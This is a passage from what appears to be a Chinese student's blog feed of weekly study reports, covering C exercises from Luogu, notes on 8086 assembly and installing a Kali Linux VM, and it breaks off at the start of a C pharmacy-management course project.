&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,name);</span><br><span class="line">		getchar();</span><br><span class="line">			<span class="keyword">while</span>(p1-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(name,p1-&gt;name)!=<span class="number">0</span>)&#123;</span><br><span class="line">				p1=p1-&gt;next;</span><br><span class="line">				num++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,num);</span><br><span class="line">				flag=<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;not found\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(num==<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;type a number:   &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">		<span class="keyword">while</span>(i!=num&amp;&amp;p1-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			p1=p1-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(p1-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;wrong number&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,p1-&gt;name);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最开始写的时候把num和name[10]放在一个共用体里，没考虑到共用体里只能有一个成员有值…</p>
<h2 id="3-汇编语言学习：">3.汇编语言学习：</h2>
<h3 id="1-存储单元：">1-存储单元：</h3>
<pre><code>bit（一个二进制位），8位bit，8个bit组成一个byte（字节）
</code></pre>
<h3 id="2-cpu对存储器的读写：">2-cpu对存储器的读写：</h3>
<p>和外部器件进行三类信息交互：</p>
<pre><code>	1.存储单元的地址（地址信息）；
	2.器件的选择，读或写（控制信息）；
	3.读或写的数据（数据信息）；
cpu通过总线传输信息，总线分为：地址，， 控制，， 数据，，
一个cpu有n根地址线，可一次传送n位二进制数据，地址总线宽度为n，
这样的cpu 最多可以对2^n个内存单元进行寻址
控制总线  ：“读信号输出”	“写信号输出”
</code></pre>
<p>存储器芯片：</p>
<pre><code>读写属性：随机存储器（ram）只读存储器（rom）
功能和连接：
	随机存储器，存放供cpu使用的绝大部分程序和数据
	接口卡上的ram，如显存
	装有bios的rom（在主板和各类接口卡上，如显卡，网卡）
</code></pre>
<p>内存地址空间：<br>
内存地址空间地址段分配<br>
基于硬件系统编程必须知道这个系统中的内存地址空间分配情况，想在某类存储器中读写数据的时候必须知道它的第一个单元的地址和最后一个单元的地址<br>
<img src="https://img-blog.csdnimg.cn/20191205180311107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="3-汇编指令：">3-汇编指令：</h3>
<p>不区分大小写</p>
<p>mov ah,78		==		将18送入寄存器ax<br>
mov ax,bx 		==		将寄存器bx中的数据送入寄存器ax<br>
add ax,bx		==		将ax和bx中的数值相加，结果存在ax中</p>
<p>ax中数值为00C5H，执行add al，93H 后，ax中数据为：0058H，不为0058H，因为此时al是作为一个独立的8位寄存器，与ah没有关系。</p>
<p>8086cpu<br>
16位结构（16位机、字长为16位）：<br>
1.运算器一次最多可以处理16位的数据<br>
2.寄存器的最大宽度为16位<br>
3.运算器和寄存器之间的通路为16位</p>
<p>两个16位地址（段地址、偏移地址）合成一个20位物理地址<br>
段地址和偏移地址通过内部总线送入地址加法器，合成后通过内部总线–&gt;输入输出控制电路–&gt;地址总线–&gt;存储器<br>
地址加法器中，物理地址=段地址 *16+偏移地址<br>
（段地址 *16表现为16进制时向左移一位，2进制时移动4位）<br>
（一个x进制的数据向左移动n位，相当于乘以x^n)</p>
<p>内存没有分段，段的划分来自于cpu，cpu可以用不同段地址和偏移地址形成同一个物理地址<br>
对于8086pc机，“数据在21F60H内存单元中”=“数据存在内存2000：1F60单元中”=“数据存在内存的2000H段中的1F60H单元中”</p>
<h3 id="4-段寄存器（segment-register）">4.-段寄存器（segment register）</h3>
<p>提供段地址<br>
6个段寄存器：<br>
cs（code）<br>
ds（data）<br>
ss（stack）<br>
es（extra）<br>
*32位：fs（flag）gs（global）</p>
<h3 id="5-CS、IP">5-CS、IP</h3>
<p>cs为代码段寄存器，IP为指令指针寄存器<br>
物理地址=CS *16+IP</p>
<p>cpu读取指令后，指令进入指令缓冲器，IP的值自动增加，增加长度等于当前读入指令长度</p>
<p>cpu刚开始工作时，CS=FFFFH,IP=0000H,即从FFFF0H单元读取指令执行。<br>
改变CS、IP的值的指令统称为转移指令，如jmp<br>
同时修改CS、IP:jmp 段地址:偏移地址<br>
只修改IP:jmp 某一合法寄存器（如ax/bx）在含义上好似： mov IP,ax</p>
<h3 id="6-字单元：">6-字单元：</h3>
<p>存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成，高地址内存单元中存放字型数据的高位字节，，，，，<br>
起始地址为n的字单元简称为n地址字单元</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2019.12.08-2019.12.14</title>
    <url>/2598.html</url>
    <content><![CDATA[<h1>2019.12.08~2019.12.14学习报告</h1>
<hr>
<h2 id="1-洛谷-P1296-奶牛的耳语">1.洛谷-P1296 奶牛的耳语</h2>
<p><img src="https://img-blog.csdnimg.cn/20191214140215863.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,d;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;d);</span><br><span class="line">	<span class="keyword">int</span> a[n];</span><br><span class="line">	<span class="keyword">int</span> g=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> temp;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(a[j]&lt;a[i])&#123;</span><br><span class="line">				temp=a[i];</span><br><span class="line">				a[i]=a[j];</span><br><span class="line">				a[j]=temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>((a[j]-a[i])&lt;=d)&#123;</span><br><span class="line">				g++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果两个测试点超时了<br>
艳玲学姐说是冒泡的时间复杂度高，要用快排</p>
<span id="more"></span>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inc</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> * a,<span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> * (<span class="keyword">int</span> * )a-* (<span class="keyword">int</span> *)b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	qsort(a,n, <span class="keyword">sizeof</span>(<span class="keyword">int</span>),inc);</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<p>了解了一下快排<br>
感觉很神奇</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUFFMQzdxRmpiNzRrdDZQZEV4UDhtdw==">漫画：什么是快速排序？（完整版）<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="2-汇编语言学习">2.汇编语言学习</h2>
<h3 id="ds和-address">ds和[address]</h3>
<blockquote>
<p>将1000：0中的数据读到al中：</p>
<p>mov bx,1000H<br>
mov ds,bx<br>
mov al,[0]</p>
</blockquote>
<p>[…]里表示的是偏移地址，执行第三条指令时cpu自动取ds中的数据作为内存单元的段地址</p>
<p>ds是段寄存器，不能用mov ds,1000H，只能用一个寄存器进行中转。</p>
<h3 id="mov-add-sub指令">mov add sub指令</h3>
<p>mov/sub/add 寄存器，数据<br>
mov/sub/add 寄存器，寄存器<br>
mov/sub/add 寄存器&lt;----&gt;内存单元</p>
<p>mov 段寄存器&lt;----&gt;寄存器<br>
mov 内存单元&lt;----&gt;段寄存器</p>
<p>sub和add 不能对段寄存器操作</p>
<h3 id="栈：">栈：</h3>
<p>入栈：将一个新的元素放到栈顶<br>
出栈：从栈顶取出一个元素<br>
栈顶的元素总是最后入栈，需要出栈时又最先被从栈中取出</p>
<h4 id="栈机制：">栈机制：</h4>
<p>都以字为单位进行<br>
push 入栈<br>
pop 出栈<br>
高地址单元存放高8位，低地址单元存放低8位</p>
<p>cpu如何知道某段空间被当作栈来使用？------栈顶的段地址存放在段寄存器SS中。<br>
cpu如何知道哪个单元时栈顶单元？------偏移地址存放在寄存器SP中。</p>
<p>push ax 执行时：</p>
<ol>
<li>sp=sp-2，ss：sp只想当前栈顶前面的单元，以当前栈顶前面的单元为新栈顶</li>
<li>将ax中的内容送入ss：sp指向的内存单元处</li>
</ol>
<p>栈空，ss：sp指向占空间最高地址单元的下一个单元：<br>
如果将10000H~1000FH这段空间当作栈，此时ss=1000，sp=0010</p>
<h4 id="栈顶超界：">栈顶超界：</h4>
<p>push：sp=sp-2，将栈空间外的数据覆盖<br>
pop：sp=sp+2，再push后将栈空间外的数据覆盖</p>
<h4 id="push、pop指令">push、pop指令</h4>
<ul>
<li>push：先改变sp，后向ss：sp传送</li>
<li>pop：先读取ss：sp处数据，后改变sp</li>
</ul>
<p>栈顶变化范围最大为0~FFFFH<br>
栈空：sp=0<br>
栈满：sp=0</p>
<p>pop后栈内数据不变化</p>
<h2 id="3-搭kali">3.搭kali</h2>
<p>1.下载并安装VMware Workstation pro、下载Kali Linux 64-bit VMware<br>
2.打开虚拟机<img src="https://img-blog.csdnimg.cn/2019121415301690.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
3.浏览网页的时候发现中文不能显示，就按照<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1c3RfaGsvYXJ0aWNsZS9kZXRhaWxzLzEwMzI5OTEzNg==">解决kali-2019.4中文乱码问题<i class="fa fa-external-link-alt"></i></span>解决了</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.01.12-2020.01.18</title>
    <url>/19661.html</url>
    <content><![CDATA[<h1>2020.1.12-2020.1.18</h1>
<hr>
<h3 id="1-scanf、getchar、getch、getche和缓冲区">1.scanf、getchar、getch、getche和缓冲区</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xMzU0OTgz">https://cloud.tencent.com/developer/article/1354983<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGFuaGFpY29kZS9wLzEwNTc1MDQ5Lmh0bWw=">https://www.cnblogs.com/lanhaicode/p/10575049.html<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>读取字符时：<br>
(1)scanf()以 Enter 结束一次输入，不会舍弃最后的回车符（即回车符会残留在缓冲区中）；<br>
(2)getchar()以 Enter 结束输入，不会舍弃最后的回车符。<br>
读取字符串时：<br>
(1) scanf()以Space、Enter、Tab结束一次输入，不会舍弃最后的回车符；<br>
(2) gets()以Enter结束输入（空格不结束），接受空格，会舍弃最后的回车符！<br>
所以读取一个字符串中的每一个字符的时候，往往使用getchar()而不使用scanf()，因为一个字符串中是会出现空格的。如果使用scanf()会造成将一个字符串首先读入第一个空格前的部分，其余部分会残留在输入缓冲区的情况，在下次读取时可能会出现错误。<br>
其次为了避免出现上述问题，必须要在读取输入前，清空缓冲区的残留数据</p>
</blockquote>
<span id="more"></span>
<p>缓冲区是一块内存空间，用来缓存数据，目的是让快速的cpu不必等待慢速的输入输出设备，同时减少操作硬件的次数</p>
<p>根据数据刷新的时机可将缓冲区类型分为<br>
1.全缓冲：当缓冲区被填满以后才进行真正的输入输出操作<br>
2.行缓冲：当输入或输出时遇到换行符时才进行真正的输入输出操作<br>
3.无缓冲：没有缓冲区，立即进行输入输出</p>
<p>Windows下c语言的printf是无缓冲的</p>
<h3 id="2-洛谷">2.洛谷</h3>
<h5 id="1-P1597-语句解析">1.P1597-语句解析</h5>
<p><img src="https://img-blog.csdnimg.cn/20200117224034766.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
没有啥思路就看题解了<br>
因为scanf成功读入一个返回值为1，读入两个返回值为2，可以此作为循环条件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">char</span> c1,c2;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%c:=%c;&quot;</span>,&amp;c1,&amp;c2)==<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(c2&gt;<span class="string">&#x27;0&#x27;</span>&amp;&amp;c2&lt;<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">			a[c1-<span class="string">&#x27;a&#x27;</span>]=c2-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			a[c1-<span class="string">&#x27;a&#x27;</span>]=a[c2-<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a[<span class="number">0</span>],a[<span class="number">1</span>],a[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">//	char a=14;</span></span><br><span class="line"><span class="comment">//	int b;</span></span><br><span class="line"><span class="comment">//	b=a;</span></span><br><span class="line"><span class="comment">//	printf(&quot;%d&quot;,b);</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-P1739-表达式括号匹配">2.P1739-表达式括号匹配</h5>
<p><img src="https://img-blog.csdnimg.cn/20200117223137978.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
第一次提交了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> b;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">			i++;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">			j++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(j==i)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>没考虑到右括号在左括号旁边的情况 如：)(a+1)*(a+2)(@<br>
看了一下题解：<br>
<strong>每出现一个左括号+1，每出现一个右括号且该变量大于0时-1.最后整个字符串判断完之后如果这个变量值为0则原表达式是匹配的。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">			i++;</span><br><span class="line">			c++;</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">			j++;</span><br><span class="line">			<span class="keyword">if</span>(c&gt;<span class="number">0</span>)</span><br><span class="line">				c--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(j==i&amp;&amp;c==<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>通过了</p>
<h3 id="3-汇编语言学习">3.汇编语言学习</h3>
<h6 id="栈段">栈段</h6>
<p>栈顶的变化范围是0~ffff，栈空时sp=0，栈满时sp也=0，一个栈容量最大为64kb<br>
执行修改栈段寄存器ss的指令时，下一条指令也紧接着被执行<br>
如 用t命令执行 mov ss，ax时，下一条mov sp，10也紧接着执行了</p>
<h6 id="一个源程序从写出到执行的过程">一个源程序从写出到执行的过程</h6>
<ol>
<li>编写汇编源程序，产生了一个存储源程序的文本文件</li>
<li>用汇编语言编译程序编译源程序，产生目标文件，再用连接程序对目标文件进行连接，生成可执行文件<br>
可执行文件包1.含程序（机器码）和数据，2.相关描述信息，如程序有多大，要占用多少内存空间等</li>
<li>执行可执行文件中的程序</li>
</ol>
<h6 id="源程序">源程序</h6>
<p>例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"> codesg segment</span><br><span class="line"> 	mov ax,0123</span><br><span class="line"> 	mov bx,0456</span><br><span class="line"> 	add ax,bx</span><br><span class="line"> 	add ax,ax</span><br><span class="line"> 	</span><br><span class="line"> 	mov ax,4c00</span><br><span class="line"> 	int 21</span><br><span class="line"> 	</span><br><span class="line"> codesg ends</span><br><span class="line"> end</span><br></pre></td></tr></table></figure>
<ol>
<li>伪指令<br>
1。<code>xxx segment\n····\nxxx ends</code><br>
是必须使用到的一对伪指令，功能是定义一个段，xxx是段名<br>
一个汇编程序是由多个段组成的，这些段被用来存放代码/数据/当作栈空间用<br>
一个汇编程序中至少要有一个段用来存放代码<br>
段名（xxx）最终将被处理为一个段的段地址<br>
2。<code>end</code><br>
是一个汇编程序的结束标记<br>
3。<code>assume</code><br>
假设某一段寄存器和程序中的某一个用 segment…ends定义的段相关联，如例中段codesg和cpu中的段寄存器cs联系起来</li>
</ol>
<h6 id="bx-和loop指令">[bx]和loop指令</h6>
<ol>
<li>[bx]<br>
要完整地描述一个内存单元，需要两种信息：1。内存单元的地址；2.内存单元的长度（类型）（有多大）<br>
mov al（ax）,[bx]   ：<br>
将一个内存单元的内容送入al（ax），这个内存单元的长度为1（2）字节，存放一个字节（一个字），偏移地址在bx中，段地址在ds中。</li>
<li>loop<br>
用loop指令实现循环功能，cx中存放循环次数<br>
执行loop指令的时候，1.（cx）=（cx)-1 ; 2.判断（cx），不为零则转至标号处执行程序，如果为零则向下执行<br>
``  例：计算2^12</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment </span><br><span class="line">	mov ax,2</span><br><span class="line">	</span><br><span class="line">	mov cx,11</span><br><span class="line">s:	add ax,ax</span><br><span class="line">	loop s</span><br><span class="line">	</span><br><span class="line">	mov ax,4c00h</span><br><span class="line">	int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.01.19-2020.02.02</title>
    <url>/17577.html</url>
    <content><![CDATA[<h3 id="1-用github搞了博客">1.用github搞了博客</h3>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFzdC5haS8yMDIwLzAxLzE2L2Zhc3RfdGVtcGxhdGUv">https://www.fast.ai/2020/01/16/fast_template/<i class="fa fa-external-link-alt"></i></span><br>
并用了他的模板…<br>
页面还没改完</p>
<h3 id="2-汇编语言学习">2.汇编语言学习</h3>
<h5 id="BX-和loop指令">[BX]和loop指令</h5>
<p>一次执行完循环的过程：<br>
g指令：<br>
“g 0012”从当前的cs：ip指向的指令执行，一直到（ip）=0012为止<br>
p指令：<br>
直到（cx）=0为止</p>
<h5 id="段前缀：">段前缀：</h5>
<p>在访问内存单元的指令中显式低给出内存单元段地址所在的段寄存器，如：<br>
mov ax,ds:[bx]<br>
mov ax,cs:[bx]<br>
mov ax,ss,[bx]<br>
mov ax,ex,[0]<br>
…</p>
<span id="more"></span>
<h5 id="在代码段中使用数据">在代码段中使用数据</h5>
<p>code segment<br>
“dw 0123，0456”<br>
…<br>
dw的含义是定义字型数据，因为用dw定义的数据出于代码段的最开始，所以偏移地址为0，这两个数据就在代码段的偏移0，2 处，地址为cs:0,cs:2</p>
<h5 id="将数、代码、栈放入不同的段">将数、代码、栈放入不同的段</h5>
<p>一个段的容量不能大于64kb（8086模式的限制）</p>
<blockquote>
<p>assume cs:code,ds:data,ss:stack<br>
data segment<br>
dw 0123h,0456h,0789h,0abch,0defh,0cbah,0987h<br>
data ends<br>
stack segment<br>
dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>
stack ends<br>
code segment<br>
start: mov ax,==stack==<br>
mov ss,ax<br>
mov sp:20h<br>
mov ax,==data==  ;将名称为data的段的段地址送入ax（数值）<br>
mov ds,ax<br>
mov bx,0<br>
mov cx,8<br>
s:	push [bx]<br>
add bx,2<br>
loop s<br>
mov bx,0<br>
mov cx,8<br>
s0:	pop [bx]<br>
add bx,2<br>
loop s0<br>
mov ax,4c00h<br>
int 21h<br>
code ends<br>
end start</p>
</blockquote>
<h5 id="and-和-or-指令">and 和 or 指令</h5>
<p>and：按位进行与运算<br>
mov al，01100011B<br>
and al，001111011B<br>
or：按位进行或运算<br>
…<br>
or al，00111011B</p>
<h5 id="以字符形式给出的数据">以字符形式给出的数据</h5>
<p>用’…'的方式指明数据是以字符形式给出的，编译器将把它们转化为对应的ascii码<br>
db ‘unix’ 相当于 db 75h,6eh,49h,58h (ascii 码)</p>
<h5 id="bx-idata">[bx+idata]</h5>
<p>mov ax,[200+bx]==mov ax,[bx+200]==mov ax,200[bx]==mov ax,[bx].200<br>
(ax)=((ds)*16+(bx)+200)<br>
用[bx+idata]的方式进行数组的处理</p>
<h5 id="SI、DI">SI、DI</h5>
<p>是和bx功能相近的寄存器，不能够分成两个8位寄存器来使用<br>
可以使用 [bx+si+idata]和[bx+di+idata]的方式表示内存单元，不能用[si+di]</p>
<h6 id="BP">BP</h6>
<p>在8086cpu中只有 si、di、bp、bx四个寄存器能在[…]里进行内存单元的寻址<br>
四个寄存器可以单个出现或只能出现：bx+si;bx+di;bp+si;bp+di。bx+b；si+di是错的<br>
只要使用了bp而没有给出段地址，段地址就默认在ss中</p>
<h6 id="数据位置的表达">数据位置的表达</h6>
<p>1.直接用立即数idata表示：mov ax,1；mov al,‘a’<br>
2.将数据存在寄存器中<br>
3.要处理的数据在内存中，可用[…]的格式给出EA,SA在某个段寄存器中</p>
<ul>
<li>1.mov ax,[bx+si+8]中 段地址默认在ds中</li>
<li>2.mov ax,[bp+si+8]中 段地址默认在ss中</li>
<li>存放段地址的寄存器也可以显性给出：mov ax,ds:[bx+si+8]</li>
</ul>
<h6 id="指令要处理的数据的尺寸">指令要处理的数据的尺寸</h6>
<ul>
<li>1.通过寄存器名指明：ax 字，al/ah 字节</li>
<li>2.用操作符_word/byte__ptr<br>
inc word ptr [bx]<br>
add byte ptr [bx],2<br>
否则cpu无法得知要访问的单元是字单元还是字节单元</li>
<li>3.其他<br>
如push,[1000]</li>
</ul>
<h4 id="寄存器整理">寄存器整理</h4>
<h6 id="bx、si、di、bp：">bx、si、di、bp：</h6>
<p>不使用bp时段地址默认在ds中<br>
使用bp时段地址默认在ss中</p>
<h6 id="dx：累加寄存器">dx：累加寄存器</h6>
<h6 id="cs：代码">cs：代码</h6>
<h6 id="ss-sp：栈顶">ss:sp：栈顶</h6>
<h6 id="ds：数据">ds：数据</h6>
<h6 id="cx：loop">cx：loop</h6>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>课设-药店管理系统</title>
    <url>/13498.html</url>
    <content><![CDATA[<p>（为了避免又发生某种奇怪的错误导致程序突然变成了前几个小时保存的版本，还是做完后把它弄到这来好了）<br>
一个功能简单的管理系统，包含了menu()里的功能以及登录、注册和称不上加密的加密</p>
<p>尝试使用了system(“pause”)、system(“cls”)以及把黑框弄成白框的system(“color 70”)</p>
<span id="more"></span>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">用于测试数据： </span></span><br><span class="line"><span class="comment">1234 哇 123 处 2000 2029 10</span></span><br><span class="line"><span class="comment">2344 吃 232 非 1234 2099 1</span></span><br><span class="line"><span class="comment">1233 啊 1234 非 2019 2020 2</span></span><br><span class="line"><span class="comment">1239 非 129 处 2001 2021 13</span></span><br><span class="line"><span class="comment">1342 哦哦、 23 处 2011 2022 13</span></span><br><span class="line"><span class="comment">3244 ·· 243 非 2011 2021 2 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">med</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> elecode;<span class="comment">//编码</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">10</span>];<span class="comment">// 